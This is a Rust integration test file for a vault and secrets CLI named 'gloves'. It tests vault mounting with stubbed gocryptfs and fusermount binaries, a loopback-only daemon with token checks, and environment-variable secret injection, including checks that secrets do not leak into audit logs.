            "GLOVES_TEST_EXTPASS_AGENT_LOG",
            extpass_agent_log.to_str().unwrap(),
        )
        .args([
            "--root",
            root,
            "vault",
            "mount",
            "agent_data",
            "--ttl",
            "1h",
            "--agent",
            "agent-b",
        ])
        .assert()
        .success();

    let logged_agent = std::fs::read_to_string(extpass_agent_log).unwrap();
    assert_eq!(logged_agent.trim(), "agent-b");
}

#[cfg(unix)]
#[test]
fn cli_vault_mount_missing_mountpoint_binary_is_actionable() {
    let temp_dir = tempfile::tempdir().unwrap();
    let fake_bin = temp_dir.path().join("fake-bin");
    fs::create_dir_all(&fake_bin).unwrap();
    let root = temp_dir.path().to_str().unwrap();

    write_executable(
        &fake_bin.join("gocryptfs"),
        r#"#!/bin/bash
set -euo pipefail
extpass=""
previous=""
for arg in "$@"; do
  if [[ "$previous" == "-extpass" ]]; then
    extpass="$arg"
  fi
  previous="$arg"
done
if [[ -n "$extpass" ]]; then
  read -r -a extpass_parts <<< "$extpass"
  "${extpass_parts[@]}" >/dev/null
fi
if [[ "$1" == "-init" ]]; then
  cipher=""
  for arg in "$@"; do
    cipher="$arg"
  done
  /bin/mkdir -p "$cipher"
  /usr/bin/touch "$cipher/gocryptfs.conf"
  exit 0
fi
mountpoint=""
for arg in "$@"; do
  mountpoint="$arg"
done
/bin/mkdir -p "$mountpoint"
/usr/bin/touch "$mountpoint/.mounted"
"#,
    );
    write_executable(
        &fake_bin.join("fusermount"),
        r#"#!/bin/bash
set -euo pipefail
echo "FUSERMOUNT_CALLED" >&2
if [[ "$1" == "-u" ]]; then
  /bin/rm -f "$2/.mounted"
fi
"#,
    );

    Command::new(assert_cmd::cargo::cargo_bin!("gloves"))
        .env("PATH", with_fake_path_and_gloves_only(&fake_bin))
        .args([
            "--root",
            root,
            "vault",
            "init",
            "agent_data",
            "--owner",
            "agent",
        ])
        .assert()
        .success();

    let output = Command::new(assert_cmd::cargo::cargo_bin!("gloves"))
        .env("PATH", with_fake_path_and_gloves_only(&fake_bin))
        .args([
            "--root",
            root,
            "vault",
            "mount",
            "agent_data",
            "--ttl",
            "1h",
        ])
        .assert()
        .failure()
        .get_output()
        .stderr
        .clone();
    let stderr = String::from_utf8_lossy(&output);
    assert!(stderr.contains("required binary not found: mountpoint"));
    assert!(!stderr.contains("FUSERMOUNT_CALLED"));

    let sessions = std::fs::read_to_string(temp_dir.path().join("vaults/sessions.json")).unwrap();
    assert_eq!(sessions.trim(), "[]");
}

#[cfg(unix)]
#[test]
fn cli_vault_unmount() {
    let temp_dir = tempfile::tempdir().unwrap();
    let fake_bin = temp_dir.path().join("fake-bin");
    install_fake_vault_binaries(&fake_bin);
    let root = temp_dir.path().to_str().unwrap();

    Command::new(assert_cmd::cargo::cargo_bin!("gloves"))
        .env("PATH", with_fake_path(&fake_bin))
        .args([
            "--root",
            root,
            "vault",
            "init",
            "agent_data",
            "--owner",
            "agent",
        ])
        .assert()
        .success();
    Command::new(assert_cmd::cargo::cargo_bin!("gloves"))
        .env("PATH", with_fake_path(&fake_bin))
        .args([
            "--root",
            root,
            "vault",
            "mount",
            "agent_data",
            "--ttl",
            "1h",
        ])
        .assert()
        .success();

    Command::new(assert_cmd::cargo::cargo_bin!("gloves"))
        .env("PATH", with_fake_path(&fake_bin))
        .args(["--root", root, "vault", "unmount", "agent_data"])
        .assert()
        .success();

    let sessions = std::fs::read_to_string(temp_dir.path().join("vaults/sessions.json")).unwrap();
    assert_eq!(sessions.trim(), "[]");
}

#[cfg(unix)]
#[test]
fn cli_vault_exec_runs_command_and_unmounts_after_success() {
    let temp_dir = tempfile::tempdir().unwrap();
    let fake_bin = temp_dir.path().join("fake-bin");
    install_fake_vault_binaries(&fake_bin);
    let root = temp_dir.path().to_str().unwrap();
    let mount_marker = temp_dir.path().join("mnt/agent_data/.mounted");

    Command::new(assert_cmd::cargo::cargo_bin!("gloves"))
        .env("PATH", with_fake_path(&fake_bin))
        .args([
            "--root",
            root,
            "vault",
            "init",
            "agent_data",
            "--owner",
            "agent",
        ])
        .assert()
        .success();

    Command::new(assert_cmd::cargo::cargo_bin!("gloves"))
        .env("PATH", with_fake_path(&fake_bin))
        .args([
            "--root",
            root,
            "vault",
            "exec",
            "agent_data",
            "--",
            "test",
            "-f",
            mount_marker.to_str().unwrap(),
        ])
        .assert()
        .success();

    let sessions = std::fs::read_to_string(temp_dir.path().join("vaults/sessions.json")).unwrap();
    assert_eq!(sessions.trim(), "[]");
    assert!(!mount_marker.exists());
}

#[cfg(unix)]
#[test]
fn cli_vault_exec_strips_extpass_env_from_wrapped_command() {
    let temp_dir = tempfile::tempdir().unwrap();
    let fake_bin = temp_dir.path().join("fake-bin");
    install_fake_vault_binaries(&fake_bin);
    write_executable(
        &fake_bin.join("print-vault-env"),
        r#"#!/usr/bin/env bash
set -euo pipefail
output="$1"
printf '%s\n%s\n' "${GLOVES_EXTPASS_ROOT:-missing}" "${GLOVES_EXTPASS_AGENT:-missing}" > "$output"
"#,
    );
    let root = temp_dir.path().to_str().unwrap();
    let env_output = temp_dir.path().join("wrapped-command.env");

    Command::new(assert_cmd::cargo::cargo_bin!("gloves"))
        .env("PATH", with_fake_path(&fake_bin))
        .args([
            "--root",
            root,
            "vault",
            "init",
            "agent_data",
            "--owner",
            "agent",
        ])
        .assert()
        .success();

    Command::new(assert_cmd::cargo::cargo_bin!("gloves"))
        .env("PATH", with_fake_path(&fake_bin))
        .env("GLOVES_EXTPASS_ROOT", "/tmp/should-not-leak")
        .env("GLOVES_EXTPASS_AGENT", "agent-should-not-leak")
        .args([
            "--root",
            root,
            "vault",
            "exec",
            "agent_data",
            "--",
            "print-vault-env",
            env_output.to_str().unwrap(),
        ])
        .assert()
        .success();

    let wrapped_env = std::fs::read_to_string(env_output).unwrap();
    assert_eq!(wrapped_env, "missing\nmissing\n");
}

#[cfg(unix)]
#[test]
fn cli_vault_exec_unmounts_when_command_fails() {
    let temp_dir = tempfile::tempdir().unwrap();
    let fake_bin = temp_dir.path().join("fake-bin");
    install_fake_vault_binaries(&fake_bin);
    let root = temp_dir.path().to_str().unwrap();
    let mount_marker = temp_dir.path().join("mnt/agent_data/.mounted");

    Command::new(assert_cmd::cargo::cargo_bin!("gloves"))
        .env("PATH", with_fake_path(&fake_bin))
        .args([
            "--root",
            root,
            "vault",
            "init",
            "agent_data",
            "--owner",
            "agent",
        ])
        .assert()
        .success();

    Command::new(assert_cmd::cargo::cargo_bin!("gloves"))
        .env("PATH", with_fake_path(&fake_bin))
        .args(["--root", root, "vault", "exec", "agent_data", "--", "false"])
        .assert()
        .code(1);

    let sessions = std::fs::read_to_string(temp_dir.path().join("vaults/sessions.json")).unwrap();
    assert_eq!(sessions.trim(), "[]");
    assert!(!mount_marker.exists());
}

#[cfg(unix)]
#[test]
fn cli_vault_status() {
    let temp_dir = tempfile::tempdir().unwrap();
    let fake_bin = temp_dir.path().join("fake-bin");
    install_fake_vault_binaries(&fake_bin);
    let root = temp_dir.path().to_str().unwrap();

    Command::new(assert_cmd::cargo::cargo_bin!("gloves"))
        .env("PATH", with_fake_path(&fake_bin))
        .args([
            "--root",
            root,
            "vault",
            "init",
            "agent_data",
            "--owner",
            "agent",
        ])
        .assert()
        .success();
    Command::new(assert_cmd::cargo::cargo_bin!("gloves"))
        .env("PATH", with_fake_path(&fake_bin))
        .args([
            "--root",
            root,
            "vault",
            "mount",
            "agent_data",
            "--ttl",
            "1h",
        ])
        .assert()
        .success();

    Command::new(assert_cmd::cargo::cargo_bin!("gloves"))
        .env("PATH", with_fake_path(&fake_bin))
        .args(["--root", root, "vault", "status"])
        .assert()
        .success()
        .stdout(predicates::str::contains("agent_data"))
        .stdout(predicates::str::contains("mounted"));
}

#[cfg(unix)]
#[test]
fn cli_vault_list() {
    let temp_dir = tempfile::tempdir().unwrap();
    let fake_bin = temp_dir.path().join("fake-bin");
    install_fake_vault_binaries(&fake_bin);
    let root = temp_dir.path().to_str().unwrap();

    Command::new(assert_cmd::cargo::cargo_bin!("gloves"))
        .env("PATH", with_fake_path(&fake_bin))
        .args([
            "--root",
            root,
            "vault",
            "init",
            "agent_data",
            "--owner",
            "agent",
        ])
        .assert()
        .success();
    Command::new(assert_cmd::cargo::cargo_bin!("gloves"))
        .env("PATH", with_fake_path(&fake_bin))
        .args([
            "--root", root, "vault", "init", "personal", "--owner", "human",
        ])
        .assert()
        .success();

    Command::new(assert_cmd::cargo::cargo_bin!("gloves"))
        .env("PATH", with_fake_path(&fake_bin))
        .args(["--root", root, "vault", "list"])
        .assert()
        .success()
        .stdout(predicates::str::contains("agent_data"))
        .stdout(predicates::str::contains("personal"));
}

#[cfg(unix)]
#[test]
fn cli_vault_ask_file() {
    let temp_dir = tempfile::tempdir().unwrap();
    let fake_bin = temp_dir.path().join("fake-bin");
    install_fake_vault_binaries(&fake_bin);
    let root = temp_dir.path().to_str().unwrap();

    Command::new(assert_cmd::cargo::cargo_bin!("gloves"))
        .env("PATH", with_fake_path(&fake_bin))
        .args([
            "--root",
            root,
            "--agent",
            "agent-b",
            "vault",
            "init",
            "agent_data",
            "--owner",
            "agent",
        ])
        .assert()
        .success();
    Command::new(assert_cmd::cargo::cargo_bin!("gloves"))
        .env("PATH", with_fake_path(&fake_bin))
        .args([
            "--root",
            root,
            "vault",
            "mount",
            "agent_data",
            "--ttl",
            "1h",
            "--agent",
            "agent-b",
        ])
        .assert()
        .success();

    Command::new(assert_cmd::cargo::cargo_bin!("gloves"))
        .env("PATH", with_fake_path(&fake_bin))
        .args([
            "--root",
            root,
            "vault",
            "ask-file",
            "agent_data",
            "--file",
            "docs/notes.txt",
            "--trusted-agent",
            "agent-b",
            "--requester",
            "agent-a",
        ])
        .assert()
        .success()
        .stdout(predicates::str::contains("Agent handoff request"))
        .stdout(predicates::str::contains("Requester: agent-a"))
        .stdout(predicates::str::contains("Trusted agent: agent-b"));
}

#[cfg(unix)]
#[test]
fn cli_vault_ask_file_requires_access() {
    let temp_dir = tempfile::tempdir().unwrap();
    let fake_bin = temp_dir.path().join("fake-bin");
    install_fake_vault_binaries(&fake_bin);
    let root = temp_dir.path().to_str().unwrap();

    Command::new(assert_cmd::cargo::cargo_bin!("gloves"))
        .env("PATH", with_fake_path(&fake_bin))
        .args([
            "--root",
            root,
            "vault",
            "init",
            "agent_data",
            "--owner",
            "agent",
        ])
        .assert()
        .success();

    Command::new(assert_cmd::cargo::cargo_bin!("gloves"))
        .env("PATH", with_fake_path(&fake_bin))
        .args([
            "--root",
            root,
            "vault",
            "ask-file",
            "agent_data",
            "--file",
            "docs/notes.txt",
            "--trusted-agent",
            "agent-b",
            "--requester",
            "agent-a",
        ])
        .assert()
        .failure();
}

#[test]
fn cli_daemon_check_passes() {
    let _guard = daemon_test_guard();
    let temp_dir = tempfile::tempdir().unwrap();
    let binary = assert_cmd::cargo::cargo_bin!("gloves");
    let root = temp_dir.path().to_str().unwrap();
    let mut last_bind_error = String::new();

    for _ in 0..DAEMON_WAIT_ATTEMPTS {
        let bind = format!("127.0.0.1:{}", reserve_loopback_port());
        let output = std::process::Command::new(binary)
            .args(["--root", root, "daemon", "--check", "--bind", &bind])
            .output()
            .unwrap();
        if output.status.success() {
            let stdout = String::from_utf8_lossy(&output.stdout);
            assert!(stdout.contains("ok"));
            return;
        }

        let stderr = String::from_utf8_lossy(&output.stderr).to_string();
        if stderr.contains("Address already in use") {
            last_bind_error = stderr;
            continue;
        }
        panic!("daemon --check failed unexpectedly: {stderr}");
    }

    panic!(
        "daemon --check did not get a free port after retries; last error: {}",
        last_bind_error
    );
}

#[test]
fn cli_daemon_check_rejects_non_loopback_bind() {
    let _guard = daemon_test_guard();
    let temp_dir = tempfile::tempdir().unwrap();

    Command::new(assert_cmd::cargo::cargo_bin!("gloves"))
        .args([
            "--root",
            temp_dir.path().to_str().unwrap(),
            "daemon",
            "--check",
            "--bind",
            "0.0.0.0:7788",
        ])
        .assert()
        .failure();
}

#[test]
fn cli_daemon_check_rejects_zero_port_bind() {
    let _guard = daemon_test_guard();
    let temp_dir = tempfile::tempdir().unwrap();

    Command::new(assert_cmd::cargo::cargo_bin!("gloves"))
        .args([
            "--root",
            temp_dir.path().to_str().unwrap(),
            "daemon",
            "--check",
            "--bind",
            "127.0.0.1:0",
        ])
        .assert()
        .failure();
}

#[test]
fn cli_daemon_check_fails_when_bind_is_in_use() {
    let _guard = daemon_test_guard();
    let temp_dir = tempfile::tempdir().unwrap();
    let busy_listener = TcpListener::bind("127.0.0.1:0").unwrap();
    let bind = busy_listener.local_addr().unwrap().to_string();

    Command::new(assert_cmd::cargo::cargo_bin!("gloves"))
        .args([
            "--root",
            temp_dir.path().to_str().unwrap(),
            "daemon",
            "--check",
            "--bind",
            &bind,
        ])
        .assert()
        .failure();
}

#[test]
fn cli_daemon_ping_roundtrip_over_tcp() {
    let _guard = daemon_test_guard();
    let temp_dir = tempfile::tempdir().unwrap();
    let (mut child, bind) = spawn_daemon_with_retry(temp_dir.path(), 1);

    let mut stream = connect_with_retry(&bind);
    stream.write_all(br#"{"action":"ping"}"#).unwrap();
    stream.write_all(b"\n").unwrap();

    let mut response_line = String::new();
    let mut reader = BufReader::new(stream);
    reader.read_line(&mut response_line).unwrap();

    assert!(response_line.contains("\"status\":\"ok\""));
    assert!(response_line.contains("\"message\":\"pong\""));

    let status = child.wait().unwrap();
    assert!(status.success());

    let audit = std::fs::read_to_string(temp_dir.path().join("audit.jsonl")).unwrap();
    assert!(audit.contains("\"event\":\"command_executed\""));
    assert!(audit.contains("\"interface\":\"daemon\""));
    assert!(audit.contains("\"command\":\"ping\""));
}

#[test]
fn cli_daemon_agent_override_isolated_per_agent() {
    let _guard = daemon_test_guard();
    let temp_dir = tempfile::tempdir().unwrap();
    let (mut child, bind) = spawn_daemon_with_retry(temp_dir.path(), 3);

    let mut set_stream = connect_with_retry(&bind);
    set_stream
        .write_all(
            br#"{"action":"set","agent":"agent-main","name":"alpha","value":"secret-value"}"#,
        )
        .unwrap();
    set_stream.write_all(b"\n").unwrap();
    let mut set_response = String::new();
    let mut set_reader = BufReader::new(set_stream);
    set_reader.read_line(&mut set_response).unwrap();
    assert!(set_response.contains("\"status\":\"ok\""));
    assert!(set_response.contains("\"id\":\"alpha\""));

    let mut denied_stream = connect_with_retry(&bind);
    denied_stream
        .write_all(br#"{"action":"get","agent":"agent-other","name":"alpha"}"#)
        .unwrap();
    denied_stream.write_all(b"\n").unwrap();
    let mut denied_response = String::new();
    let mut denied_reader = BufReader::new(denied_stream);
    denied_reader.read_line(&mut denied_response).unwrap();
    assert!(denied_response.contains("\"status\":\"error\""));
    assert!(denied_response.contains("unauthorized"));

    let mut get_stream = connect_with_retry(&bind);
    get_stream
        .write_all(br#"{"action":"get","agent":"agent-main","name":"alpha"}"#)
        .unwrap();
    get_stream.write_all(b"\n").unwrap();
    let mut get_response = String::new();
    let mut get_reader = BufReader::new(get_stream);
    get_reader.read_line(&mut get_response).unwrap();
    assert!(get_response.contains("\"status\":\"ok\""));
    assert!(get_response.contains("\"secret\":\"secret-value\""));

    let status = child.wait().unwrap();
    assert!(status.success());
}

#[test]
fn cli_daemon_token_rejects_missing_and_accepts_valid_token() {
    let _guard = daemon_test_guard();
    let temp_dir = tempfile::tempdir().unwrap();
    let (mut child, bind) = spawn_daemon_with_retry_and_env(
        temp_dir.path(),
        2,
        &[("GLOVES_DAEMON_TOKEN", "test-token")],
    );

    let mut unauthorized_stream = connect_with_retry(&bind);
    unauthorized_stream
        .write_all(br#"{"action":"ping"}"#)
        .unwrap();
    unauthorized_stream.write_all(b"\n").unwrap();
    let mut unauthorized_response = String::new();
    let mut unauthorized_reader = BufReader::new(unauthorized_stream);
    unauthorized_reader
        .read_line(&mut unauthorized_response)
        .unwrap();
    assert!(unauthorized_response.contains("\"status\":\"error\""));
    assert!(unauthorized_response.contains("invalid daemon token"));

    let mut authorized_stream = connect_with_retry(&bind);
    authorized_stream
        .write_all(br#"{"action":"ping","token":"test-token"}"#)
        .unwrap();
    authorized_stream.write_all(b"\n").unwrap();
    let mut authorized_response = String::new();
    let mut authorized_reader = BufReader::new(authorized_stream);
    authorized_reader
        .read_line(&mut authorized_response)
        .unwrap();
    assert!(authorized_response.contains("\"status\":\"ok\""));
    assert!(authorized_response.contains("\"message\":\"pong\""));

    let status = child.wait().unwrap();
    assert!(status.success());
}

#[test]
fn cli_daemon_invalid_request_returns_error_and_continues() {
    let _guard = daemon_test_guard();
    let temp_dir = tempfile::tempdir().unwrap();
    let (mut child, bind) = spawn_daemon_with_retry(temp_dir.path(), 2);

    let mut stream = connect_with_retry(&bind);
    stream.write_all(br#"{"action":"ping""#).unwrap();
    stream.write_all(b"\n").unwrap();

    let mut response_line = String::new();
    let mut reader = BufReader::new(stream);
    reader.read_line(&mut response_line).unwrap();
    assert!(response_line.contains("\"status\":\"error\""));
    assert!(response_line.contains("invalid daemon request"));

    let mut second_stream = connect_with_retry(&bind);
    second_stream.write_all(br#"{"action":"ping"}"#).unwrap();
    second_stream.write_all(b"\n").unwrap();

    let mut second_response_line = String::new();
    let mut second_reader = BufReader::new(second_stream);
    second_reader.read_line(&mut second_response_line).unwrap();
    assert!(second_response_line.contains("\"status\":\"ok\""));
    assert!(second_response_line.contains("\"message\":\"pong\""));

    let status = child.wait().unwrap();
    assert!(status.success());
}

#[test]
fn cli_daemon_set_generate_with_value_returns_error() {
    let _guard = daemon_test_guard();
    let temp_dir = tempfile::tempdir().unwrap();
    let (mut child, bind) = spawn_daemon_with_retry(temp_dir.path(), 1);

    let mut stream = connect_with_retry(&bind);
    stream
        .write_all(br#"{"action":"set","name":"x","generate":true,"value":"abc"}"#)
        .unwrap();
    stream.write_all(b"\n").unwrap();

    let mut response_line = String::new();
    let mut reader = BufReader::new(stream);
    reader.read_line(&mut response_line).unwrap();

    assert!(response_line.contains("\"status\":\"error\""));
    assert!(response_line.contains("generate cannot be combined with value"));

    let status = child.wait().unwrap();
    assert!(status.success());
}

#[test]
fn cli_daemon_set_rejects_non_positive_ttl() {
    let _guard = daemon_test_guard();
    let temp_dir = tempfile::tempdir().unwrap();
    let (mut child, bind) = spawn_daemon_with_retry(temp_dir.path(), 2);

    let mut stream = connect_with_retry(&bind);
    stream
        .write_all(br#"{"action":"set","name":"x","value":"abc","ttl_days":0}"#)
        .unwrap();
    stream.write_all(b"\n").unwrap();

    let mut response_line = String::new();
    let mut reader = BufReader::new(stream);
    reader.read_line(&mut response_line).unwrap();

    assert!(response_line.contains("\"status\":\"error\""));
    assert!(response_line.contains("ttl_days must be greater than zero"));

    let mut second_stream = connect_with_retry(&bind);
    second_stream.write_all(br#"{"action":"ping"}"#).unwrap();
    second_stream.write_all(b"\n").unwrap();

    let mut second_response_line = String::new();
    let mut second_reader = BufReader::new(second_stream);
    second_reader.read_line(&mut second_response_line).unwrap();
    assert!(second_response_line.contains("\"status\":\"ok\""));

    let status = child.wait().unwrap();
    assert!(status.success());
}

// Tests for --env-secrets feature (SHP-116)

#[cfg(unix)]
#[test]
fn cli_vault_exec_injects_secret_as_env_var() {
    let temp_dir = tempfile::tempdir().unwrap();
    let fake_bin = temp_dir.path().join("fake-bin");
    install_fake_vault_binaries(&fake_bin);
    let root = temp_dir.path().to_str().unwrap();

    // Initialize vault
    Command::new(assert_cmd::cargo::cargo_bin!("gloves"))
        .env("PATH", with_fake_path(&fake_bin))
        .args(["--root", root, "vault", "init", "agent_data", "--owner", "agent"])
        .assert()
        .success();

    // Create a secret
    Command::new(assert_cmd::cargo::cargo_bin!("gloves"))
        .env("PATH", with_fake_path(&fake_bin))
        .args([
            "--root", root,
            "secrets", "set", "test/secret",
            "--value", "super-secret-value",
            "--ttl", "1",
        ])
        .assert()
        .success();

    // Create a script that prints the env var
    let print_env_script = temp_dir.path().join("print-env.sh");
    std::fs::write(
        &print_env_script,
        r#"#!/bin/bash
echo "MY_SECRET=$MY_SECRET"
"#,
    )
    .unwrap();
    std::fs::set_permissions(&print_env_script, std::fs::Permissions::from_mode(0o755)).unwrap();

    // Run vault exec with --env-secrets
    let output = Command::new(assert_cmd::cargo::cargo_bin!("gloves"))
        .env("PATH", with_fake_path(&fake_bin))
        .args([
            "--root", root,
            "vault", "exec", "agent_data",
            "--env-secrets", "MY_SECRET=test/secret",
            "--",
            print_env_script.to_str().unwrap(),
        ])
        .output()
        .unwrap();

    let stdout = String::from_utf8_lossy(&output.stdout);
    assert!(
        stdout.contains("super-secret-value"),
        "Expected secret value in output, got: {}",
        stdout
    );
}

#[cfg(unix)]
#[test]
fn cli_vault_exec_injects_multiple_secrets_as_env_vars() {
    let temp_dir = tempfile::tempdir().unwrap();
    let fake_bin = temp_dir.path().join("fake-bin");
    install_fake_vault_binaries(&fake_bin);
    let root = temp_dir.path().to_str().unwrap();

    // Initialize vault
    Command::new(assert_cmd::cargo::cargo_bin!("gloves"))
        .env("PATH", with_fake_path(&fake_bin))
        .args(["--root", root, "vault", "init", "agent_data", "--owner", "agent"])
        .assert()
        .success();

    // Create secrets
    Command::new(assert_cmd::cargo::cargo_bin!("gloves"))
        .env("PATH", with_fake_path(&fake_bin))
        .args(["--root", root, "secrets", "set", "api/key", "--value", "key-123", "--ttl", "1"])
        .assert()
        .success();
    Command::new(assert_cmd::cargo::cargo_bin!("gloves"))
        .env("PATH", with_fake_path(&fake_bin))
        .args(["--root", root, "secrets", "set", "api/token", "--value", "token-456", "--ttl", "1"])
        .assert()
        .success();

    // Create a script that prints both env vars
    let print_env_script = temp_dir.path().join("print-multi-env.sh");
    std::fs::write(
        &print_env_script,
        r#"#!/bin/bash
echo "API_KEY=$API_KEY"
echo "API_TOKEN=$API_TOKEN"
"#,
    )
    .unwrap();
    std::fs::set_permissions(&print_env_script, std::fs::Permissions::from_mode(0o755)).unwrap();

    // Run vault exec with multiple --env-secrets
    let output = Command::new(assert_cmd::cargo::cargo_bin!("gloves"))
        .env("PATH", with_fake_path(&fake_bin))
        .args([
            "--root", root,
            "vault", "exec", "agent_data",
            "--env-secrets", "API_KEY=api/key",
            "--env-secrets", "API_TOKEN=api/token",
            "--",
            print_env_script.to_str().unwrap(),
        ])
        .output()
        .unwrap();

    let stdout = String::from_utf8_lossy(&output.stdout);
    assert!(
        stdout.contains("key-123"),
        "Expected API_KEY in output, got: {}",
        stdout
    );
    assert!(
        stdout.contains("token-456"),
        "Expected API_TOKEN in output, got: {}",
        stdout
    );
}

#[cfg(unix)]
#[test]
#[cfg(unix)]
#[test]
fn cli_vault_exec_env_secrets_missing_secret_fails() {
    let temp_dir = tempfile::tempdir().unwrap();
    let fake_bin = temp_dir.path().join("fake-bin");
    install_fake_vault_binaries(&fake_bin);
    let root = temp_dir.path().to_str().unwrap();

    // Initialize vault
    Command::new(assert_cmd::cargo::cargo_bin!("gloves"))
        .env("PATH", with_fake_path(&fake_bin))
        .args(["--root", root, "vault", "init", "agent_data", "--owner", "agent"])
        .assert()
        .success();

    // Create a script that prints the env var
    let print_env_script = temp_dir.path().join("print-env.sh");
    std::fs::write(&print_env_script, "#!/bin/bash\necho \"MY_SECRET=$MY_SECRET\"\n").unwrap();
    std::fs::set_permissions(&print_env_script, std::fs::Permissions::from_mode(0o755)).unwrap();

    // Run vault exec with --env-secrets pointing to non-existent secret
    let output = Command::new(assert_cmd::cargo::cargo_bin!("gloves"))
        .env("PATH", with_fake_path(&fake_bin))
        .args([
            "--root", root,
            "vault", "exec", "agent_data",
            "--env-secrets", "MY_SECRET=nonexistent/secret",
            "--",
            print_env_script.to_str().unwrap(),
        ])
        .output()
        .unwrap();

    // Should fail because secret doesn't exist
    assert!(
        !output.status.success(),
        "Expected failure for missing secret, but command succeeded"
    );
}

#[cfg(unix)]
#[test]
fn cli_vault_exec_secrets_not_leaked_in_audit_logs() {
    let temp_dir = tempfile::tempdir().unwrap();
    let fake_bin = temp_dir.path().join("fake-bin");
    install_fake_vault_binaries(&fake_bin);
    let root = temp_dir.path().to_str().unwrap();

    // Initialize vault
    Command::new(assert_cmd::cargo::cargo_bin!("gloves"))
        .env("PATH", with_fake_path(&fake_bin))
        .args(["--root", root, "vault", "init", "agent_data", "--owner", "agent"])
        .assert()
        .success();

    // Create a secret with a unique value we can search for
    let secret_value = "unique-secret-value-12345";
    Command::new(assert_cmd::cargo::cargo_bin!("gloves"))
        .env("PATH", with_fake_path(&fake_bin))
        .args([
            "--root", root,
            "secrets", "set", "leak-test/secret",
            "--value", secret_value,
            "--ttl", "1",
        ])
        .assert()
        .success();

    // Create a simple script that runs without output
    let noop_script = temp_dir.path().join("noop.sh");
    std::fs::write(&noop_script, "#!/bin/bash\ntrue\n").unwrap();
    std::fs::set_permissions(&noop_script, std::fs::Permissions::from_mode(0o755)).unwrap();

    // Run vault exec with --env-secrets
    Command::new(assert_cmd::cargo::cargo_bin!("gloves"))
        .env("PATH", with_fake_path(&fake_bin))
        .args([
            "--root", root,
            "vault", "exec", "agent_data",
            "--env-secrets", "MY_SECRET=leak-test/secret",
            "--",
            noop_script.to_str().unwrap(),
        ])
        .assert()
        .success();

    // Check the audit.jsonl - secret values should NOT appear there
    let audit_log_path = temp_dir.path().join("audit.jsonl");
    let audit_content = std::fs::read_to_string(&audit_log_path).unwrap();
    
    // The secret value should not appear in the audit.jsonl
    assert!(
        !audit_content.contains(secret_value),
        "Secret value should not leak into audit.jsonls. Audit content: {}",
        audit_content
    );
}
